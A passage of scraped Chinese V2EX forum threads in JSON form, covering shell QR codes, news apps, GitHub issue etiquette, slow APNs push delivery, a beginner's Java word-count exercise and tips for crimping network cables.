MMMM  MMMMMMMM\r<br>MMMM  MMMM      MMMM  MMMM  MMMM  MMMM      MMMM  MMMMMMMMMMMM  MMMMMMMMMMMM  MMMMMMMM            MMMMMMMM  MMMMMMMM\r<br>MMMM  MMMM      MMMM  MMMM  MMMMMMMM    MMMMMMMMMMMMMMMM  MMMM  MMMMMMMMMMMMMMMMMMMMMMMM      MMMM  MMMMMMMM  MMMMMMMMMMMMMMMM\r<br>MMMM  MMMM      MMMM  MMMMMMMM  MMMM        MMMM    MMMM  MMMM    MMMM    MMMMMMMM  MMMMMMMM            MMMM\r<br>MMMM  MMMMMMMMMMMMMMMMMMMM  MMMMMMMMMMMM    MMMMMMMM  MMMMMMMMMMMM          MMMMMMMMMMMM  MMMMMMMMMMMM  MMMM  MMMM      MMMM\r<br>MMMM              MMMMMMMM  MMMMMMMM    MMMMMMMM    MMMMMMMM  MMMMMMMMMMMM  MMMMMMMMMMMM  MMMM  MMMMMMMM  MMMMMMMM  MMMM\r<br>MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM</div>"], "reply": "3", "tittle": "请教一个 Python 和 Linux Shell 的二维码问题", "comment": ["一个思路 把二维码生成为图片，然后转换为字符画显示在屏幕上\r", "\r", "\r", "\r", "直接搜 Gen qr code shell 找出来的", "你应该 给 git 项目 提 issue 呀\r", "\r", "```\r", "“说是安装 Pillow ，折腾半天，安装不了。 ”\r", "```\r", "\r", "安装不了，也要想办法安上", "我也写过一个 wechatbot ，但是我是把图片直接上传到图床了。\r", "在命令行上来显示二维码这种体验并不好，而且各种兼容问题很难处理。\r", " 贴一把链接。"]},
{"content": ["<div class=\"topic_content\">谢谢</div>"], "reply": "19", "tittle": "有哪些英文的类似今日头条的聚合式的新闻客户端？", "comment": ["竟然不知道鼻祖 Flipboard?", "All USA News", " 我连今日头条都卸载了。。。。。", "news digest", "News360", "BuzzFeed", "Apple News", "Buzzfeed", "老早有个 Zite ，关张了…", "……吐个槽，楼上各位提的 BuzzFeed 和今日头条这俩刚好一对标题党啊。", " 美国 NBC News 旗下的 ", " 去年年底就停止服务了", "Sony News Suite", "即刻", "即刻 +1", "我以前用今日头条只看小品\r", "现在干脆卸载了", "google now 根据你的 chrome 历史访问记录以及 google 搜索历史选择推送内容"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://music.163.com/#/playlist?id=574654394&amp;userid=66991805\" rel=\"nofollow\">http://music.163.com/#/playlist?id=574654394&amp;userid=66991805</a></div>"], "reply": "目前尚无回", "tittle": "[歌单] 前端框架大作战", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>维护几个小项目，最头疼的就是中文用户的 Issues ，有那么一大部分的人，不看 <a href=\"http://README.md\" rel=\"nofollow\">README.md</a> 、不看已关闭的 Issues 、提问 Issues 的时候不看预置的问题须知和模板；简单统计下的话，至少 60%的中文用户是把 Issues 当论坛、当贴吧了、甚至很多时候连自己的业务问题和程序问题都分不清楚网上 po ！想拉黑也没办法，只能一次次受煎熬</p>\n<p>比如这样的：</p>\n<p><a href=\"https://github.com/surmon-china/vue-quill-editor/issues/36\" rel=\"nofollow\">https://github.com/surmon-china/vue-quill-editor/issues/36</a></p>\n<p>这样的</p>\n<p><a href=\"https://github.com/surmon-china/vue-awesome-swiper/issues/18\" rel=\"nofollow\">https://github.com/surmon-china/vue-awesome-swiper/issues/18</a></p>\n</div></div>", "<div class=\"topic_content\">其实这不是个例，像 wee 项目早被当成论坛了\r<br>\r<br><a target=\"_blank\" href=\"https://github.com/alibaba/weex/issues\" rel=\"nofollow\">https://github.com/alibaba/weex/issues</a>\r<br><a target=\"_blank\" href=\"https://github.com/alibaba/weex/issues/2947\" rel=\"nofollow\">https://github.com/alibaba/weex/issues/2947</a>\r<br>\r<br>这种地域化的方式会把世界的开发者排除在外，最终就没人贡献了</div>", "<div class=\"topic_content\">ISSUE_TEMPLATE 也很早就加上了，在用户提交新的 Issues 的时候，内容区占据的是预置的中英文说明 + 问题模板，然而我会说用户把问题会写到标题里，模板不删除，就这么提交了\r<br>\r<br>像这样的还不够清晰额\r<br><a target=\"_blank\" href=\"https://github.com/surmon-china/vue-quill-editor/issues/new\" rel=\"nofollow\">https://github.com/surmon-china/vue-quill-editor/issues/new</a></div>"], "reply": "77", "tittle": "面对那些过分的 Issues 中文用户该怎么办", "comment": ["把相关 issues 回复给他, 然后关闭 issue", "如题，看不懂题目的问题吗......好霸气..", "这种也是需要引导和维护的，肯定不会所有来访用户都明白你的或者社区的规则，当然也有明知故犯的，就像道路交通参与的各方一样。\r", "既然承担的维护的任务，或多或少都是不可避免的，心烦就多吐槽吧\r", "猜测外文用户应该也有这类毛病吧", " web 开发里，特别他那个问题，可能的原因很多，不是文字能表达清楚的，最起码需要截图来指明问题", " 即便这么做，也解决不了，其实一直在这么做，问题合并问题合并，合并合并在合并，还是有人再来开个新的", "building Lord ……   这个是机翻么……", "居然用\"楼主\"， 233333", "不应该是去 Stackoverflow 上问么？", " 国外也有，比这好点", "building lord 哈哈哈哈哈哈哈哈哈", "应该是做开源项目都会这样。\r", "直接给出一个怎么搜索答案的链接，然后关闭 issue 就完事了。\r", "只是这样做可能会招来一些骂声，就看你能否承受了。", " 必然是 ...哈", " ISSUE_TEMPLATE 被无视了，直接无视", "收费呀，按问题收费", "关掉就是了，你没有解答问题的义务。", " ", " 😂double click six six six!", "这有点歧视中文用户了吧，英文的不也照样一大堆不看关闭 issue 的，回答就丢个之前已关闭的 issue 就关闭问题了。英文也一样有很多人问奇奇怪怪问题描述不全的。\r", "\r", "我不是说这些用户做得对，只是说并不只中文用户会这样， github 上牛鬼蛇神太多了，什么都会碰上的，只不过楼主维护的项目中文使用的人多一些而已。", " 没毛病，是这么回事", "参考 you-get 项目，用机器人过滤", "很多人把 issue 当论坛了吧", "歧视中文用户了, 不是每个人都能用英文准确描述出自己遇到的问题", "可以学习一下 laravel 的 issue 提交都给定好了预置格式（就像 html5 的 placeholder 一样）并且有各种提 issue 之前的注意事项，按照格式提交，开发者就好处理。", "文档, README, 代码注释 全部用英文的，这样能避免很多完全不动脑子的人，如果中文用户想学好开发，英文必须流畅", " 其实背后的潜台词应该是能够用英文准确描述自己问题的人相对素质更高，提出这种无意义 issue 的概率较小", "英文也一样（可能少一点？", " 根据百度翻译 building load 是楼主的意思", " ", " 正解", " 都做了，早就做了， ISSUE_TEMPLATE 被无视了，整整的中英文说明都被无视了，提交问题的时候连删都不删", " 这种蛋疼 issue ，我还遇到过标题是 not working 正文是空的呢，根本没得说理去", " hah", "非报 bug/feature request 的 issue 一律按小时收费", "我估计这人看不懂 issue template 里面的英文，所以你在 template 下面写的提交 jsbin/JSFiddle 之类的自然也就被他忽视了", "删掉中文说明 ", " ", "我使用过你的这个富文本编辑器，谢谢你的付出。不过用英文和中文没啥关系的，英语也一群....，用英语也很多国人的", "见过有些老外做的开源项目，国人跑到 issue 里面用纯汉字提问，这是一种什么样的精神？", " 帮助国际友人提高汉语水平的无私奉献精神", "搞个机器人自动关 issue ", " 在邮件列表里看到这个，我都懵逼了", "直接关掉 issue 功能，只接受 PR", " 这个解释我服气。哈哈哈。", "\r", "这个问题，我试了一下，复现过程是这样的\r", "1 ，左右翻页那个蓝色按钮。\r", "2 ，在双击后，第二击按住，也就是没有 mouseup 。\r", "切换动画就会卡在中间不动", "有些英文的 Issue 也挺无语的，上来一个， Won't work ，其他的什么也不贴……问他吧，他又不回复，不问吧，有的直接给你发邮件炸你…", "有没有人写一个通用的 bot ？目前我是没看到好的…", "可以开个 QQ 群给他们自己玩去(", "其实还有一种人，故意在我的项目里发黄图，非要恶心我", "写好了,只回复英语 issue,写在首页!\r", "又不是商业项目,没必要为所有人解答...", "把 issue 模版写得简短一些，太长的话基本没人看，即便你写的都是很基础的要求。\r", "我这么做了之后，收到的 issue 质量好很多~", "用英文来写文档和回答，很见效，基本没有中文 issue 出来\r", "因为他们一看这个组件全是英文，马上就放弃了", "长见识了，居然还有这么多奇葩。", "套总消消气←_←", "Closed due to cannot reproduce and no log provided.\r", "\r", "任何攻击性的全 report 。\r", "\r", "问题解决。", " hah ，也是想方便国人使用所以中英都写了", " 收到，这个官方 bug", "就算你这么说,我还是希望能够推出不带默认样式的 swiper 选项,现在都是自己手动去移除的,东西给别人跑就比较麻烦.如果你哪天突然闲的话", " 可以把组件部分单独拿出去用，或者 fork 到自己 git ， package.json 中版本号改为自己的 git 地址", " 这就有点歧视中文用户了 \r", "\r", "-----------\r", "想我当时第一次用的时候(或者现在也是?) 也是感觉出现问题如果不是自己领域的 没法解决 就很想去“反馈”这个问题 然后就可能会踩 Issue 的坑 被人鄙视，毕竟没有学习过如何《正确使用 Github 》作为常年在论坛不动脑筋的丢帖子的人 肯定是会把 issue 当论坛用，开发者也有刚入门的和大神的区别嘛 小白遇到很焦急的时候 理性的会先去翻翻谷歌 查查 Issue 找人问 不理性的就会直接提 issue 上去(然后被喷) \r", "----------\r", "上面那段废话并没有什么卵用。我想表达的意思是 使用 Github 的人因水平不同 可能这方面中文用户更加凸显一点 但是这并不代表应该拒绝中文用户 英文用户也会有这种人的呀 只是可能相对少一点 我遇到很多项目都是写明了不接受中文提问 即便是 telegram 一个组都是中国人 但是就是不让说中文 就很气 对于一个英文还不足以好到可以完整表述的人 这时候想去解决问题 对方却不想和你沟通 并跟你说 Please speak English ， 我能怎么办 除了默默的 unfo unstar \r", "----------\r", "我很赞同正确引导用户(中英文)使用 issue 的做法 也让我这种曾经(现在也是!)小白的用户也能注意到自己的行为，但是很反对因为这点而去开地域模式的\r", "----------\r", "对于那些不看 ReadMe 的人可以给一次原谅 对于不看提问模板内容的(有中文)小(sha)白(bi)就只能归结为教育失败了", "楼主一开始就应该假装自己是外国人。。。", " 然而这个帅气的头像一看就不是外国人", "我有时看不懂代码的时候也会问问", " 所以作假要做全套～(￣▽￣～)~", "我一般是挂一个 Trash 的标签，然后直接 close ，不做回复", "hahha~ 好有爱", "建个 qq 群", " 关键是不看模板啊，他们真的不看，，，", "设置一个 label ，比如： dafuq ，然后关闭 issue 。无视，不回复。再有人问脑残问题，就回复链接，让他看看 dafuq 下有多少类似的脑残问题……==", " 不不不,我不是为了自己的项目做考虑,我认为有很大一部分人都希望有这个功能,既然有需求我觉得如果可以的话可以让他实现以下....", "感觉是对方在赶项目，卡在你这个插件上，然后不想自己修，丢锅给你： D\r", "然而一般都不会理会你，究竟为什么不给他修，因为他在用你的项目做一个一个亿的项目呀～\r", "哈哈", "你觉得不爽可以直接 close 并 lock 啊", "直接拉黑。\r", "\r", "\r", "\r", "我觉得可以做个 GitHub Issue Blocker ，做成 integration service ，然后把这些乱搞的用户全部上黑名单。", "那就把项目做成英文的吧，这样中文用户就会少了，用中文提 Issues 的自然也少了。", " #37 \r", "\r", "我还见过有些国人做的开源项目，外国人跑到 issue 里面用纯英文提问呢，你说这是一种什么样的精神？", " 类比不恰当。 GitHub 是英文社区", "要换成是我的话，我会把一些规章置顶 issues ，然后如果有用户第一次这样，我就耐心告诉他你看看规章你再来提问题，这样有利于问题的解决，但是第二次还不改，那我就打死他！！！", " 哟，破娃你也在这啊。\r", "\r", "那些人直接警告，不行拉黑删完事，这就是找事。\r", "和无厘头诋毁软件的人似的。", "是这样的啦，现在除了非常小众，门槛特高的地方，别的地方都是伸手党越来越多。"]},
{"content": ["<div class=\"topic_content\">第一代 apns 使用 socket 长链经常说断就断，过了一会才能得到 broken 的反馈，最近了解到 apns 出了 http2 的版本，每个推送都会有反馈，赶紧升级了一下，但是现在感觉推送速度好慢啊... 使用“ <a target=\"_blank\" href=\"http://api.push.apple.com\" rel=\"nofollow\">api.push.apple.com</a> ” 这个域名，应该是美国的 ip ，国内有什么办法提升速度吗</div>"], "reply": "11", "tittle": "苹果的 apns2 推送感觉速度好慢啊，有人用过吗？", "comment": ["没有办法，几乎都是要通过 apns", "为什么 QQ 微信的推送不会慢", " 我也很想知道，我推一千条居然要 35 秒", "单机推送？\r", "一千条已经很不错的速度，我自己做的推送服务器，可没法做到这个速度。", " 我发现用 443 端口会快一些 1000 条 10 秒内推完", "有时候我推一条有时候就要我 5 秒的时间，我 TMD 的也是醉了！\r", "一度怀疑是我代码有问题！", "这种推送不是 socket ，设计上应该不考虑实时通讯，估计是用来做快速通讯（ 30~60s ）估计是他们的设计误差范围。\r", "---\r", "如果是我设计的话。\r", "对付全球在线的 ios 推送，做到这个层次很 NB ： D 哈哈\r", "就是我们用来接入麻烦。", "推 VOIP TOKEN 呢，别用普通推送？", "我用 nghttp2 来推送，有时候有一些要 250 秒呢！", "开多个 client 并发推，我司的 iOS 推送就是这样做的", " 我开了 1000 个携程推，我觉得瓶颈在于单条的发送速度上.."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>表妹在某 211 上学，文科，选修 Java ，今天问我一道题目。大意是给一段字符串，统计里面各单词出现次数，最后按次数从高到低输出单词和次数。我就写了个程序，把字符串 split 之后用 HashMap 统计次数，然后导出到 ArrayList 里排序。写完之后她说不行，这些数据结构都没学过，老师一看就不是自己写的:(。我问她学到哪了，她说只学了基本的数据类型，条件循环语句和数组。问排序教了吗，回答说教了：</p>\n<pre><code>for(int i=0;i&lt;size;i++)\n    for(int j=0;j&lt;size;j++)\n        if(n[i]&lt;n[j]){\n\t    k=n[i];n[i]=n[j];n[j]=k;\n\t}\n</code></pre>\n<p>......</p>\n<p>最后拜托我只用<strong>数组</strong>把这道题写一下。</p>\n<p>这是大一下学期课时文科 8 周的 Java 选修......................</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>import java.util.*;\n\npublic class Main {\n    public static void main(String[] args) {\n        String s1=\"Kemono Friends is a Japanese media franchise created by manga artist Mine Yoshizaki. The project initially began as a smartphone game developed by Nexon, which ran between March 2015 and December 2016. A manga by Furai was serialized in Kadokawa's Monthly Shōnen Ace between May 2015 and March 2017, and an anime television series produced by Yaoyorozu aired between January and March 2017. Despite its low production quality, the anime series earned praise from critics and viewers in Japan due to its well crafted storyline and characters, becoming a fad in the country.[1] A new video project has been greenlit for production.\";\n        String regex = \"[\\\\s\\\\p{Punct}]+\";\n        Map&lt;String, Integer&gt; map = new HashMap&lt;&gt;();\n        for (String word : s1.split(regex))\n            if (map.containsKey(word))\n                map.put(word, map.get(word) + 1);\n            else\n                map.put(word, 1);\n        List&lt;Map.Entry&lt;String, Integer&gt;&gt; list = new ArrayList&lt;&gt;(map.entrySet());\n        list.sort((a, b) -&gt; b.getValue() - a.getValue());\n        for (Map.Entry&lt;String, Integer&gt; e : list)\n            System.out.println(e.getKey() + \"\\t\\t\\t\" + e.getValue());\n    }\n}\n</code></pre>\n</div></div>", "<div class=\"topic_content\">我只是觉得现在课程真是可怕啊\r<br>```Java\r<br>public class Main {\r<br>    public static void main(String[] args) {\r<br>        String s1 = \"Kemono Friends is a Japanese media franchise created by manga artist Mine Yoshizaki. The project initially began as a smartphone game developed by Nexon, which ran between March 2015 and December 2016. A manga by Furai was serialized in Kadokawa's Monthly Shōnen Ace between May 2015 and March 2017, and an anime television series produced by Yaoyorozu aired between January and March 2017. Despite its low production quality, the anime series earned praise from critics and viewers in Japan due to its well crafted storyline and characters, becoming a fad in the country.[1] A new video project has been greenlit for production.\";\r<br>        String regex = \"[\\\\s\\\\p{Punct}]+\";\r<br>        String[] words = s1.split(regex);\r<br>        Integer wordCount = 0;\r<br>        String[] key = new String[words.length];\r<br>        int[] count = new int[words.length];\r<br>        for (String word : words) {\r<br>            boolean found = false;\r<br>            for (int i = 0; i &lt; wordCount; ++i)\r<br>                if (key[i].equals(word)) {\r<br>                    ++count[i];\r<br>                    found = true;\r<br>                    break;\r<br>                }\r<br>            if (!found) {\r<br>                key[wordCount] = word;\r<br>                count[wordCount] = 1;\r<br>                ++wordCount;\r<br>            }\r<br>        }\r<br>        for (int i = 0; i &lt; wordCount; ++i)\r<br>            for (int j = 0; j &lt; wordCount; ++j)\r<br>                if (count[i] &gt; count[j]) {\r<br>                    String ts = key[i];\r<br>                    int tc = count[i];\r<br>                    key[i] = key[j];\r<br>                    count[i] = count[j];\r<br>                    key[j] = ts;\r<br>                    count[j] = tc;\r<br>                }\r<br>        for (int i = 0; i &lt; wordCount; ++i)\r<br>            System.out.println(key[i] + \"\\t\\t\\t\" + count[i]);\r<br>    }\r<br>}\r<br>```</div>"], "reply": "56", "tittle": "这个槽我一定要吐。。", "comment": ["顺序截取字母，放到 switch case 里面", "反正我知道北邮的经管也要学 c++，我觉得是疯了。。。。", "八周不就两个月么。半学期讲基本语法没毛病吧。", "那就先排序，然后跑一遍就统计出来了", "表妹怎么联系（逃…", " 全民编程时代已经来临.", " 选修\r", "\r", "楼主我感觉你的槽应该在表妹，文科，选修。\r", "\r", "自然不会接触集合啥的。。。。", "那么问题来了，你这样代写家庭作业真的好么 ", " ", "文科计算机二级还是汇编呢 \r", "汇编逆向什么的是不是都会啊？", "其他学科学编程又不是要能用，是要学习自动机的思想，你上来就调一堆 API 有什么用？", "代写完作业 然后就推了？🤔", "表妹照片呢?", "文科学 Java ，看来以后要说“学好编程自动化，打遍天下都不怕”。", "骨科？", "晒表妹", "果然有人跟我想到一块去。。。   # 德国骨科 手动再见\r", "如果是 0 编程基础，文科八周选修按进度学到排序没毛病啊…", "没有表妹的照片,差评", "连文科都学编程了。。。以后也要多学学经济学，文学之类的了，感觉荒废了太长时间，伤心", "所以说小学的题目得用小学的方式解答", " 这个如何?", " 还学通信原理呢", "我们学校文科的要学 C 、高数、电路........还要参加一个综合上机考试，考操作系统、数据结构、 C 、 office 、 linux.....没考过不让毕业.......", "？给字符串是求字母出现的次数还是单词出现的次数？\r", "如果是字母的话，可以建一个 26 字母的 int 数组，比如说 a 出现一次就数组[0]+=1 ，等到要输出的时候就一个简单排序，把数组元素输出，同时 a 的 ASCII 码加上对应的数组下标输出字母。\r", "如果不是字母的话，不好意思啦~", "我能说我学建筑的，居然要上 visual foxpro 吗？还有学环境工程的舍友，他们居然要上 visual basic 。真是想不通学校的培养方案啊，搞水泥沙子的和和搞化工的，居然还要学编程。", "这道题的最优解的复杂度是 nlogn 吧", " 没什么特别条件的话排序不都是最优 nlogn 嘛\r", "\r", " 我校学 MATLAB ，讲真我觉得工程学点 MATLAB 和 cad 比学通用语言要有用", " cad 我们是必修课，但是我搞不懂学 visual foxpro 对职业有什么现实意义？难道去工地上编程？", " \r", "全行业学编程这一点都没错。各种外挂插件就是那些行业内会编程的人搞出来的。", " 估计微软给钱了，或者教材，或者教师……\r", "我校学 cad 不学 autocad 学 simens nx 就是因为西门子给钱………", " 也许是个人观点和现实需求吧，我个人不认为编程在建筑工地上能发挥很大的作用", " 我们学的是 autocad ， visual foxpro ，还有广联达。学广联达我没意见，建筑工程做造价肯定会用到。但是尼马的学 visual foxpro 是个啥意思？难道还得去工地上自己编程？真搞不懂我们专业的培养方案是哪个人制定出来的", " 实际上我个人觉得全民编程不太现实。。。\r", "而且即使全民编程，也不是学习 c++这种可能会让人深恶痛绝的语言。。。", " 上了一个假的文科？", "咱表妹怎么联系😂", " \r", "机械 or 汽车专业？ auto cad 确实没啥好教，西门子也看不上它有啥威胁， inventor 或许还有点威胁。 ug 的在国内竞争对手是 catia 、 sw 、 proe\\croe 这些，学校总要在这几个里面挑一个来教吧。\r", "\r", "\r", " \r", "工具而已，会写脚本来减少重复工作多好。", "怎么看都是楼主的情商更想令人吐槽", "我有个同学学法律的，还要学数据库，，惊了", " 还不如教 CCED 和 dBase 了……（ x", " 我想知道有没有程序员在实际工作中用 visual foxpro 来编程？", " 据我妈说她们大学时候学的就是 CCED", "求表妹。。。照片。。", "有一撮人觉得“人人该学一点编程”，另外一撮人觉得“我一个非计科专业的学生，怎么就跑来学计算机了呢？”", "没什么问题阿 一个问题本身就可以有不同的解法 不是最优解又怎么样呢", "没看出来哪里值得吐槽。。", "没照片差评", "  #40 应该是没有了吧，但是 COBOL Fortran 我还是看到过有人用", "面向表哥编程", " 有，但是没记错的话差不多是十五年前的事情了。", "你讲述了一个事情。吐槽在哪呢？", "刚想说一句 sage ，然后发现这不是岛。", "文科又是选修，懒得吐槽。卤煮是来秀表妹的", " 我个人觉得，非计算机 /电子 /通信 /信号等这类专业的人学编程，对实际工作似乎没什么太大帮助。（也许是我接触的层次不够高吧）\r", "\r", " 那现在实际应用中，有用 visual basic 来编程的吗？", "这是让学生自己实现常用数据结构的操作方法,基础入门都是这样,\r", "只有培训班才会上来就直接用现成轮子吧.", " 有很多吧。其实用什么语言来写并不是那么重要的问题。现在不还有 asp 啊 perl 写的网站么。只要代码写得好，各种语言都不会差得那么多。", "看到了动物朋友（（（"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>2017 全球机器学习技术大会系列直播！</p>\n<p>主题：机器学习在能源行业的应用</p>\n<p>时间： 4 月 18 日（周二）晚 8 点</p>\n<p>特邀嘉宾：林嵩，中国石油数据科学家</p>\n<p>直播报名链接： <a href=\"http://ml-summit.org/\" rel=\"nofollow\">http://ml-summit.org/</a></p>\n</div></div>"], "reply": "11", "tittle": "机器学习直播： 机器学习在能源行业的应用", "comment": ["山寨的很，还加工作人员拉我进群，别逗我了", "看了下门票价格，还挺贵的", "写个 SVM 就算机器学习？", "并没有一个能源领域的专家啊", " 可以向公司申请哦，而且大会质量绝对值这个票价！", " SVM 咋了？瞧不起啊", "好贵啊。。。欢迎来清华参加 R 语言会议 ", "svm 也能拿出来显啊。。。。", " 不加工作人员，怎么拉你进群呐~  >_<", "议题没写一个你就要让我交 4760 来听？", " 别急啊，日程后期会更新上去，可以先参加 4 月 18 日晚 8 点，《机器学习在能源行业的应用》直播~~~"]},
{"content": ["<div class=\"topic_content\">RT 实验课刚开始学制作网线。基础运维职位 制作网线是经常用的吗？安装服务器集群的时候网线是有规格制作好的？还是现场制作呢？以后想做个运维。</div>"], "reply": "75", "tittle": "各位制作一根双绞线一般用几分钟？有什么窍门吗？", "comment": ["我之前在学校网络中心做兼职，经常需要做网线，成品有，但是长度一般都不合适，所以经常需要自己做网线，偶尔还要做模块。一般一两分钟就做好了吧，熟能生巧，做多了自然就快了。", "有专门的钳子，把线排好插进去夹一下就行了，估计 30s 以内", "熟能生巧，多钻研。\r", "\r", "做网线真的是门学问", "学从难处学，实际用的时候直接买就是了", "你说的是把线插上水晶头吧？这个倒是挺快，一分钟能做两个吧。自己搓根线出来那是从来没做过。", "不要赶时间，成品率才是关键", "橙百橙绿白蓝蓝白绿棕白棕", "以前会自己压水晶头,现在基本上都是直接买成品线了,自己压的都是临时用用\r", "但是模块还是要自己做,即使买了 AMP 专门压模块的工具,做起来也是有些费力", "服务器的一般都是买成品线 没多少自己压的..  \r", "自己压的话 注意成品率 然后再慢慢提升速度..\r", "还有开始用便宜的头这样 能慢慢锻炼自己手的力量把握.", "当初参加思科网院比赛的时候极限 48s 一根，膜拜楼上 30s 内\r", "现在 2 分钟一个根，不急慢慢做，熟能生巧的东西", "百兆 1 分钟一个头，千兆 2 分钟一个头", "曾经 30 秒一根，现在 2 分钟一根。\r", "工具要趁手，且线材质量很重要。。", "有专门的钳子的，把线缕顺了用钳子一夹还是挺快的\r", "线一定要缕好，不然等怼到水晶头里就乱了", "线序得记住。买把好钳子 一下一个。", "六类线。。真的。。很难压。。中间那个棒子反人类", "白橙 橙 白绿 蓝 白蓝 绿 白棕 棕,背过线序就 ok 了,其实不按线序来做也能通,现在的网卡都有乱序功能,但老设备可能会不兼容", "熟能生巧，无他耳。想当年我也是压制水晶头的快手，不过现在年纪大了，连线序都忘了。", "想起了大学时，因为水晶头完成的还可以，然后被拉去新装修的计算机大楼，做了三四间教室水晶头的恐惧。。。\r", "本来不想加逗号的。。", "在学校的时候做过", "打水晶头买一把好的制线钳\r", "要是打模块的话买一把好的打线刀\r", "\r", "工欲善其事必先利其器", "橙绿蓝棕，四六交换", "5 分钟吧，不能急", "前段时间做了一堆 6 类线，手指快要不得了，只能慢慢搞，换着手指的来。。。", "好几分钟把线慢慢捋平齐。算是自我放松的一种方式，越急越做不好，越做不好越急。", "买一堆各种规格成品线……", "忽悠转基因得下面被狗吃了", "橙白 橙 绿白 蓝 蓝白 绿 棕白 棕", "六类好难做啊..做的还不怎么好看", "第一份实习工作，入职头一周在工位看资料戴耳机听音乐，被老板惩罚做 100 根跳线。\r", "\r", "2 天完成了任务，从 10 多分钟一根到最后 1 分钟左右 1 根，做网线的技巧提升了很多，当然学到更多的还是工作态度。很感谢这位老板。", "五类线 1 分钟一根，六类线……最长的时候做了 30 分钟", " 居然不允许听歌，这怎么过。。", " 六类线太硬 家里装修我自己打头 打完几个头手就酸的不行。。。", "这个与线材，水晶头，钳子有直接关系。", "没事不做双绞线，虽然做得很好，但是有集成商啊。", "再长时间也没法做…\r", "色弱……", " +1", "左橙右棕白先行\r", "绿的张开腿\r", "蓝的反过来插中间。。。", "当年机房学的口诀，受用终生，橙白橙绿白蓝蓝白绿棕白粽", "剥皮 掰线 a 类排序  剪平 插入水晶头 压线咁压下\r", "最好备一把剪刀 毕竟压线咁问题多", "做个网线有网线钳的话最多 1 分钟，没有网线钳就要看手里工具是啥了。", "白橙橙白绿蓝白蓝绿白棕粽", "普通的线还好说，接七类线，弄死个仙人板板！😂😂", "橙白 橙 绿白 蓝 蓝白 绿 棕白 棕\r", "\r", "白橙 橙 白绿 蓝 白蓝 绿 白棕 粽\r", "\r", "这两种说法不知道有没有乐意开撕的，我瓜子买好了！", "窍门嘛……中间四根线错色就对了，之前看的书里和师父教我的线序不一样（白绿绿……/白橙橙……），后来明白是 A / B 两种规范。\r", "然后就练吧，一开始总把线头卡子压坏，做了一暑假才好。当然现在也是虚，五类线以上还是算了吧（", "工具和线材合适的话 30s 到一分钟是没问题的……多压一些就好了", "哈哈，作为一个文科生，本科时在学校网络中心干活，做了三四年网线，因为我们学校不用成品线，所以每年特定时期（比如暑假前）做的网线可以堆得跟小山一样\r", "1.剥线刀转一圈截掉外皮， 5s\r", "2.按顺序把双绞线捋平(这个技巧难以描述)，用大拇指按住，网线钳剪齐， 20s\r", "3.塞进水晶头，用力塞到底，注意网线外皮要超过水晶头那个卡扣位置， 5s\r", "4.按着水晶头保持塞进去的线不位移松动，网线钳压线，一定要用力， 5s\r", "理想状态两个头 70s ，佩服楼上 30s 做完的...", "咒语：红白红绿白蓝蓝白绿棕白粽", "主要看钳子的价格", "普通网线两三分钟。\r", "中间带十字骨架的，，得十分钟。。。 质量越好（铜线越粗），弄起来就越累手费时。", "自己做的总感觉不稳定，以前初中的时候做过，自己家用的。一般是那种超长买不到的线。\r", "现在应该都得用六类线了，买成品吧", "做网线孰能生效。第一次做，做一根要个三五分钟。最好是带上测线仪，对于像我这种菜鸟来说尤其重要。熟练后应该就好很多了。", " 是熟能生巧。。打了错别字。。。", "没人用 1236 这种记发吗？\r", "不过用数字记就无法完全按色序标准做头了。", "不记顺序的掩面飘过，做的少，一般自己用的话只保证两头的顺序一致就 OK 了", "5 分钟左右", "我能成功的时间主要取决于是五类线还是六类线\r", "不过根据我大学的时候在网络中心参与机房改造的经历来看，乙方会有一批专门的工人负责搬服务器和做网线，通常我做一根对方能做出五根，对运维来说做网线会就行，快慢真的没那么重要吧", "哎，大学里面从来没有做过网线的飘过~  话说最后一次做网线还是装修的时候连路由器\r", "\r", "白橙橙白绿蓝白蓝绿白棕棕... 这个估计很难忘记吧\r", "\r", "诀窍就是剥线的时候剥长一点，好捋直，捋直后在排序，排序后剪齐，一插一卡， Over", "做完六类线再去做超五类都感觉线好捋多了", "戴手套 过来人忠告……", "如果仅仅自己用，应急的话。\r", "直接两边颜色排序一致就 ok 了。   不用区分什么颜色，口诀。\r", "对，就是指连线。现在的硬件设备，基本兼容直连交叉。", " 原来也有人发现这个事。。。 我第一次学做这个网线的时候，就实验了一下。\r", "当时还不想跟其他同学说，怕带坏了他们。  😄", " 这么干确实带坏同学，网线两两对绞是为了啥，干扰啊。", "一个水晶头大约 30s\r", "如果是特别好的网线，可能要慢一点，特别硬的", "  对，你说的这点我忽略了。 我一直认为是统一线序，是为了方便 debug 。 \r", "我这就去把家里的水晶头剪了，重做。   - -！", "在机器其时间 15s\r", "现在 1800s\r", "---\r", "孰能生巧.", " 又来错字。\r", "在机房期间 15s", "记得的动作就是：\r", "1. 拉长\r", "2. 松开\r", "3. 压平\r", "4. 剪齐\r", "5. 塞入\r", "6. 压线\r", "7. 重复...", "爷爷的锤子，做网线很痛苦的，就算是日线，空手撸十几个头你的手就很疼了，还好现在有撸线器。", " 自己搓个八股估计有点难……", "线最好不软不硬 没有十字架没有屏蔽网 钳子最好带铰链加力", "这个，做网线不需要学吧，就是个线序给记下来就行了，之后就是熟能生巧。\r", "\r", " \r", "你初中的时候做网线，那应该是五类线或者超五类吧，五类线或者超五类线，自己做也不会“不稳定”。\r", "最主要的是要压的越紧越好。\r", "六类线没做过就不敢说了。", "工具顺手 30 秒左右一根", "千兆头麻烦点，大概两三分钟，百兆头 30 秒左右一个，工具很重要！！！", "线要好，一剪开就散的铜包钢就很难对付；压线钳要好，宝工网线钳就不错；最后就是多做几个，熟能生巧。", "压线钳是个重点"]},
